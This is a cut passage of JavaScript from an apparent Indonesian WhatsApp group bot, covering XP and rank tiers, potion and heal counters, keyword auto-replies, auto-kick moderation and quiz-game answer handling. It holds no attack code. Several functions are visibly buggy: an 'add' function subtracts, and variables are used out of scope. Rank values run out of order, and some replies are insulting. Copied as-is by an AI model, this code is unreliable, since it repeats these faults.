} else if (levelRole <= 13) {
rank = 'Warrior I'
} else if (levelRole <= 16) {
rank = 'Elite V'
} else if (levelRole <= 19) {
rank = 'Elite IV'
} else if (levelRole <= 22) {
rank = 'Elite III'
} else if (levelRole <= 25) {
rank = 'Elite II'
} else if (levelRole <= 28) {
rank = 'Elite I'
} else if (levelRole <= 31) {
rank = 'Master V'
} else if (levelRole <= 34) {
rank = 'Master IV'
} else if (levelRole <= 37) {
rank = 'Master III'
} else if (levelRole <= 40) {
rank = 'Master II'
} else if (levelRole <= 43) {
rank = 'Master I'
} else if (levelRole <= 46) {
rank = 'GrandMaster V'
} else if (levelRole <= 49) {
rank = 'GrandMaster IV'
} else if (levelRole <= 52) {
rank = 'GrandMaster III'
} else if (levelRole <= 55) {
rank = 'GrandMaster II'
} else if (levelRole <= 58) {
rank = 'GrandMaster I'
} else if (levelRole <= 61) {
rank = 'Epic V'
} else if (levelRole <= 64) {
rank = 'Epic IV'
} else if (levelRole <= 67) {
rank = 'Epic III'
} else if (levelRole <= 70) {
rank = 'Epic II'
} else if (levelRole <= 73) {
rank = 'Epic I'
} else if (levelRole <= 76) {
rank = 'Legend V'
} else if (levelRole <= 79) {
rank = 'Legend IV'
} else if (levelRole <= 82) {
rank = 'Legend III'
} else if (levelRole <= 85) {
rank = 'Legend II'
} else if (levelRole <= 88) {
rank = 'Mythic V'
} else if (levelRole <= 91) {
rank = 'Mythic IV'
} else if (levelRole <= 93) {
rank = 'Mythic lll'
} else if (levelRole <= 96) {
rank = 'Mythic ll'
} else if (levelRole <= 98) {
rank = 'Mythic l'
} else if (levelRole <= 101) {
rank = 'Mythical Glory'
} else if (levelRole <= 104) {
rank = 'Mythical Glory ★400'
} else if (levelRole <= 107) {
rank = 'Mythical Glory ★700'
} else if (levelRole <= 109) {
rank = 'Mythical Glory ★900'
} else if (levelRole <= 112) {
rank = 'Mythical Glory ★1200'
} else if (levelRole <= 115) {
rank = 'Mythical Glory ★1500'
} else if (levelRole <= 118) {
rank = 'Mythical Glory ★1800'
} else if (levelRole <= 121) {
rank = 'Mythical Glory ★2100'
} else if (levelRole <= 124) {
rank = 'Mythical Glory ★2400'
} else if (levelRole <= 127) {
rank = 'Mythical Glory ★2700'
} else if (levelRole <= 130) {
rank = 'Mythical Glory ★3000'
} else if (levelRole <= 133) {
rank = 'Mythical Glory ★4300'
} else if (levelRole <= 136) {
rank = 'Mythical Glory ★4600'
} else if (levelRole <= 139) {
rank = 'Mythical Glory ★4900'
} else if (levelRole <= 142) {
rank = 'Mythical Glory ★4200'
} else if (levelRole <= 145) {
rank = 'Mythical Glory ★4500'
} else if (levelRole <= 148) {
rank = 'Mythical Glory ★4800'
} else if (levelRole <= 151) {
rank = 'Mythical Glory ★5100'
} else if (levelRole <= 154) {
rank = 'Mythical Glory ★5400'
} else if (levelRole <= 157) {
rank = 'Mythical Glory ★5700'
}

let Levelnye = level.getLevelingLevel(sender, _level)
let Xpluu = level.getLevelingXp(sender, _level)
let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100

const bayarPotion = (sender, amount) => {
let position = false
Object.keys(_heal).forEach((i) => {
if (_potion[i].id === sender) {
position = i
}
})
if (position !== false) {
_potion[position].potion -= amount
fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
}
}
const addPotioUser = (sender, amount) => {
let position = false
Object.keys(_potion).forEach((i) => {
if (_potion[i].id === sender) {
position = i
}
})
if (position !== false) {
_potion[position].potion -= amount
fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
}
}
const potionAdd = (sender) => {
let position = false
Object.keys(_potion).forEach((i) => {
 if (_potion[i].id == sender) {
 position = i
}
})
if (position !== false) {
_potion[position].potion += 1
fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
}
}

//function check heal
const checkHeal = (sender) => {
let foundh = false
for (let heallmt of _heal) {
if (heallmt.id === sender) {
const healCounts = healawal - heallmt.heal
if (healCounts <= 0) return textImg(`ya udah habis Heal kamu\n\n_Note : tenang Heal bisa didapatkan dengan cara ${prefix}usepotion`)
textImg(`HEAL : ${healCounts}`)
foundh = true
}
}
if (foundh === false) {
let obj = { id: sender, heal: 0 }
_heal.push(obj)
fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
textImg(`HEAL : ${healCounts}`)
}
}
//funtion potion
const isPotion = (sender) =>{ 
let position = false
for (let i of _potion) {
if (i.id === sender) {
let potions = i.potion
if (potions >= potionawal ) {
position = true
textImg(`Beli Potion ngab di /buypotion`)
return true
 } else {
 _potion
 position = true
 return false
 }
 }
 }
 if (position === false) {
 const obj = { id: sender, potion: 0 }
 _potion.push(obj)
 fs.writeFileSync('./database/adventure/potion.json',JSON.stringify(_potion))
 return false
}
}
const checkPotion = (sender) => {
let foundh = false
for (let potionlmt of _potion) {
if (potionlmt.id === sender) {
const potionCounts = potionawal - potionlmt.potion
if (potionCounts <= 0) return textImg(`ya udah habis potion kamu\n\n_Note : tenang limit bisa dibeli dengan cara ${prefix}buypotion`)
textImg(`POTION : ${potionCounts}`)
foundh = true
}
}
 if (foundh === false) {
 let obj = { id: sender, potion: 0 }
_potion.push(obj)
 fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
textImg(`POTION : ${potionCounts}`)
}
}

if (isGroup && !level.isGained(sender) && isLevelingOn && !isMuted && !isBan) {
const currentLevel = level.getLevelingLevel(sender, _level)
try {
level.addCooldown(sender)
const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
level.addLevelingXp(sender, amountXp, _level)
if (requiredXp <= level.getLevelingXp(sender, _level)) {
level.addLevelingLevel(sender, 1, _level)
const userLevel = level.getLevelingLevel(sender, _level)
const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
let ststsss = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
reply(`*───「 LEVEL UP 」───*

❑ *Nama :* ${pushname}
❑ *Tag :* @${sender.split('@')[0]}
❑ *Info kontak :* ${ststsss.status}
❑ *Exp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}
❑ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙
❑ *Rank :* ${rank}

Selamat ya!! 🎉🎉`, {contextInfo: {"mentionedJid": [sender]}})
}
} catch (err) {
console.error(err)
}

if (!isMuted && !isOwner2 && !isBan && !fromMe && !isOwner2){
if (chats.match(/(Samlekom)/gi)) {
reply(`Ngucap Salam Yang Bener Anjing🗿`)
}
}
if (!isMuted && !isOwner2 && !isBan && !fromMe && !isOwner2){
if (chats.match(/(Askum)/gi)) {
reply(`Ngucap Salam Yang Bener Anjing🗿`)
}
}
if (!isMuted && !isOwner2 && !isBan && !fromMe && !isOwner2){
if (chats.match(/(\/nyimak)/gi)) {
reply(`Sad amat hidup lu sampai jadi sider🙁`)
}
}
if (!isMuted && !isOwner && !isBan && !fromMe && !isOwner2){
if (chats.match(/(Sayank)/gi)) {
reply(`Apa sayank sayank, jomblo ya awokawok :v`)
}
}

if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Terima kasih)/gi)) {
reply(`Sama sama *${pushname}*`)
}
}
if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Thanks)/gi)) {
reply(`Sama sama *${pushname}*`)
}
}
if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Terimakasih)/gi)) {
reply(`Sama sama *${pushname}*`)
}
}
if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Makasih)/gi)) {
reply(`Sama sama *${pushname}*`)
}
}
if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Nyimak;v)/gi)) {
reply(`Sad amat hidup lu sampai jadi sider *${pushname}*`)
}
}
if (!isMuted && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(i miss you)/gi)) {
reply(`I Miss You Too *${pushname}*`)
}
}

if (!isMuted && !isOwner && !fromMe && !isOwner2 && !isBan){
if (chats.match(/(Surya)/gi)) {
textImg(`Stop sebut sebut nama surya!`)
}
}
if (!isMuted && !isOwner && isGroup && !isBan){
if (chats.match(/(@62895415497664)/gi)) {
textImg(`Stop tag tag surya!`)
}
}

if (isGroup && isBadword){
for (let kasar of badword){
if (chats.toLowerCase().includes(kasar)){
if (isCountKasar(sender, _senbadword)){
if (!isBotGroupAdmins) return textImg(`Kamu beruntung karena bot bukan admin`)
textImg(`*「 ANTI BADWORD 」*
Sepertinya kamu sudah berkata kasar lebih dari 10x, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
delCountKasar(sender, _senbadword)
} else {
addCountKasar(sender, _senbadword)
const buttons = [{buttonId: 'delcountkasar', buttonText: {displayText: 'Astaghfirullah'}, type: 1}]
const buttonsMessage = {
contentText: `@${sender.split('@')[0]} terdeteksi berkata kasar
Jangan ulangi lagi atau kamu akan saya kick!

*_Jika sudah 10x maka kamu akan di kick oleh bot secara otomatis!_*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
}
}
}
if (isGroup && !isMuted && isLelah && isUser){
for (let capek of lelah){
if (chats.toLowerCase().includes(capek)){
if (isCountCapek(sender, sencapek)){
if (!isBotGroupAdmins) return textImg(`Kamu beruntung karena bot bukan admin`)
textImg(`*「 ANTI WIBU TERDETEKSI 」*
Sepertinya kamu sudah berkata wibu lebih dari 5x, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
delCountCapek(sender, sencapek)
} else {
addCountCapek(sender, sencapek)
textImg(`*「 ANTI WIBU TERDETEKSI 」*
Lu terdeteksi berkata wibu
Jangan ulangi lagi atau lu gua kick`)
}
}
}
}

}
//Muted
if (isBan) return
if (isMuted) {
if (!isOwner && !fromMe && !isOwner2) return
if (chats.toLowerCase().startsWith('unmute')){
let anu = mute.indexOf(from)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
reply(`Bot telah diunmute di group ini`)
}
}

cekWaktuFam(surya, family100)
game.cekWaktuTG(surya, tebakgambar)
game.cekWaktuCak(surya, caklontong)
game.cekWaktuTL(surya, tebaklirik)
game.cekWaktuTLG(surya, tebaklagu)
game.cekWaktuSA(surya, siapaaku)
game.cekWaktuTS(surya, tebakjenaka)
game.cekWaktuAO(surya, asahotak)
game.cekWaktuTK(surya, tebakkata)
game.cekWaktuTU(surya, tebakkimia)
game.cekWaktuTB(surya, tebakbendera)
game.cekWaktuTA(surya, tebakanime)
game.cekWaktuTKAL(surya, tebakkalimat)
game.cekWaktuTT(surya, tekateki)
game.cekWaktuSK(surya, susunkata)
game.cekWaktuMtk(surya, mtk)


if (game.isTebakLagu(from, tebaklagu) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTLG(from, tebaklagu))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isSusunKata(from, susunkata) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanSK(from, susunkata))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTekaTeki(from, tekateki) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTT(from, tekateki))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakKalimat(from, tebakkalimat) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTKAL(from, tebakkalimat))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakGambar(from, tebakgambar) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isMtk(from, mtk)){
if (!chats.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isCakLontong(from, caklontong) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanCak(from, caklontong))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakJenaka(from, tebakjenaka) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTS(from, tebakjenaka))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isSiapaAku(from, siapaaku) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isAsahOtak(from, asahotak) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanAO(from, asahotak))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakKata(from, tebakkata) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakKimia(from, tebakkimia) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTU(from, tebakkimia))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakBendera(from, tebakbendera) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
textImg(`*Jawaban salah!*`)
}
}
if (game.isTebakAnime(from, tebakanime) && !isBan && isUser){
if (!chats.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
textImg(`*Jawaban salah!*`)
}
}

if (game.isTebakLagu(from, tebaklagu) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTLG(from, tebaklagu))){
var htlg = randomNomor(`${balanc}`)
addBalance(sender, htlg, balance)
const buttons = [{buttonId: 'tebaklagu;', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗟𝗔𝗚𝗨

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTLG(from, tebaklagu)}
*Hadiah :* $${htlg}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, sender]}, quoted: msg})
tebaklagu.splice(game.getTLGPosi(from, tebaklagu), 1)
}
}

if (game.isSusunKata(from, susunkata) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanSK(from, susunkata))){
var hsk = randomNomor(`${balanc}`)
addBalance(sender, hsk, balance)
const buttons = [{buttonId: 'susunkata', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗦𝗨𝗦𝗨𝗡 𝗞𝗔𝗧𝗔

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanSK(from, susunkata)}
*Hadiah :* $${hsk}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
susunkata.splice(game.getSKPosi(from, susunkata), 1)
}
}

if (game.isTekaTeki(from, tekateki) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTT(from, tekateki))){
var htt = randomNomor(`${balanc}`)
addBalance(sender, htt, balance)
const buttons = [{buttonId: 'tekateki', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗞𝗔 𝗧𝗘𝗞𝗜

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTT(from, tekateki)}
*Hadiah :* $${htt}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tekateki.splice(game.getTTPosi(from, tekateki), 1)
}
}

if (game.isTebakKalimat(from, tebakkalimat) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTKAL(from, tebakkalimat))){
var htkal = randomNomor(`${balanc}`)
addBalance(sender, htkal, balance)
const buttons = [{buttonId: 'tebakkalimat', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗞𝗔𝗟𝗜𝗠𝗔𝗧

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTKAL(from, tebakkalimat)}
*Hadiah :* $${htkal}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tebakkalimat.splice(game.getTKALPosi(from, tebakkalimat), 1)
}
}

if (game.isTebakGambar(from, tebakgambar) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(`${balanc}`)
addBalance(sender, htgm, balance)
const buttons = [{buttonId: 'tebakgambar', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗚𝗔𝗠𝗕𝗔𝗥

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTG(from, tebakgambar)}
*Hadiah :* $${htgm}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
}
}

if (game.isMtk(from, mtk)){
if (chats.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
var htgm3 = randomNomor(`${balanc}`)
addBalance(sender, htgm3, balance)
const buttons = [{buttonId: 'mtk1', buttonText: {displayText: 'Math Very Easy️'}, type: 1},{buttonId: 'mtk2', buttonText: {displayText: 'Math Easy'}, type: 1},{buttonId: 'mtk3', buttonText: {displayText: 'Math Medium️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗠𝗔𝗧𝗛

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanMtk(from, mtk)}
*Hadiah :* $${htgm3}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
mtk.splice(game.getMtkPosi(from, mtk), 1)
}
}

if (game.isMtk(from, mtk)){
if (chats.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
var htgm3 = randomNomor(`${balanc}`)
addBalance(sender, htgm3, balance)
const buttons = [{buttonId: 'mtk4', buttonText: {displayText: 'Math Hard'}, type: 1},{buttonId: 'mtk5', buttonText: {displayText: 'Math Extreme️'}, type: 1},{buttonId: 'mtk6', buttonText: {displayText: 'Math Impossible️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗠𝗔𝗧𝗛

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanMtk(from, mtk)}
*Hadiah :* $${htgm3}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
mtk.splice(game.getMtkPosi(from, mtk), 1)
}
}

if (game.isCakLontong(from, caklontong) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanCak(from, caklontong))){
var htgms = randomNomor(`${balanc}`)
addBalance(sender, htgms, balance)
const buttons = [{buttonId: 'caklontong', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗖𝗔𝗞 𝗟𝗢𝗡𝗧𝗢𝗡𝗚

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanCak(from, caklontong)}
*Hadiah :* $${htgms}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
caklontong.splice(game.getCakPosi(from, caklontong), 1)
}
}

if (game.isTebakLirik(from, tebaklirik) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTL(from, tebaklirik))){
var htgml = randomNomor(`${balanc}`)
addBalance(sender, htgml, balance)
const buttons = [{buttonId: 'tebaklirik', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗟𝗜𝗥𝗜𝗞

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTL(from, tebaklirik)}
*Hadiah :* $${htgml}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}
}

if (game.isTebakJenaka(from, tebakjenaka) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTS(from, tebakjenaka))){
var htgmj = randomNomor(`${balanc}`)
addBalance(sender, htgmj, balance)
const buttons = [{buttonId: 'tebakjenaka', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗝𝗘𝗡𝗔𝗞𝗔

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTS(from, tebakjenaka)}
*Hadiah :* $${htgmj}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tebakjenaka.splice(game.getTSPosi(from, tebakjenaka), 1)
}
}
if (game.isSiapaAku(from, siapaaku) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(`${balanc}`)
addBalance(sender, htgmu, balance)
const buttons = [{buttonId: 'siapakahaku', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗦𝗜𝗔𝗣𝗔𝗞𝗔𝗛 𝗔𝗞𝗨

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanSA(from, siapaaku)}
*Hadiah :* $${htgmu}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}
}

if (game.isAsahOtak(from, asahotak) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanAO(from, asahotak))){
var htmao = randomNomor(`${balanc}`)
addBalance(sender, htmao, balance)
const buttons = [{buttonId: 'asahotak', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗔𝗦𝗔𝗛 𝗢𝗧𝗔𝗞

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanAO(from, asahotak)}
*Hadiah :* $${htmao}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
asahotak.splice(game.getAOPosi(from, asahotak), 1)
}
}

if (game.isTebakKata(from, tebakkata) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(`${balanc}`)
addBalance(sender, htgtk, balance)
const buttons = [{buttonId: 'tebakkata', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗞𝗔𝗧𝗔

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTK(from, tebakkata)}
*Hadiah :* $${htgtk}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net'], quoted: textImg}})
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}
}

if (game.isTebakKimia(from, tebakkimia) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTU(from, tebakkimia))){
var reva = randomNomor(`${balanc}`)
addBalance(sender, reva, balance)
const buttons = [{buttonId: 'tebakkimia', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗞𝗜𝗠𝗜𝗔

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTU(from, tebakkimia)}
*Hadiah :* $${reva}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
tebakkimia.splice(game.getTUPosi(from, tebakkimia), 1)
}
}

if (game.isTebakBendera(from, tebakbendera) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(`${balanc}`)
addBalance(sender, syahira, balance)
const buttons = [{buttonId: 'tebakbendera', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗕𝗘𝗡𝗗𝗘𝗥𝗔

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTB(from, tebakbendera)}
*Hadiah :* $${syahira}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
tebakbendera.splice(game.getTBPosi(from, sender, tebakbendera), 1)
}
}

if (game.isTebakAnime(from, tebakanime) && !isBan && isUser){
if (chats.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(`${balanc}`)
addBalance(sender, vinna, balance)
